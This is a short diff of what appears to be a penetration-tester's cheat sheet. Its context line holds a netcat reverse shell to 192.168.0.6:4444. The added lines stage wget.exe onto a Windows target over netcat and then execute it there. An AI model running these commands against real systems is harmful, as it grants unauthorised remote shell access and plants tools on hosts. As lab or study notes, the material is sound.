@@ -22,3 +22,16 @@ nc 192.168.0.6 4444 -e /bin/bash
 
 # Buffer overflow
 Local bo is not intereseting check for remote bo
+
+# transfer files to windows
+//on target system and redirect any file to incoming.exe
+nc -nlvp 4444 > incoming.exe
+
+//locate file
+locate wget.exe
+
+// transfer file => we need to wait for file being uploaded
+nc -nv 10.11.0.22 4444 < /user/share/.../wget.exe
+
+//on target but first abort nc
+incoming.exe -v
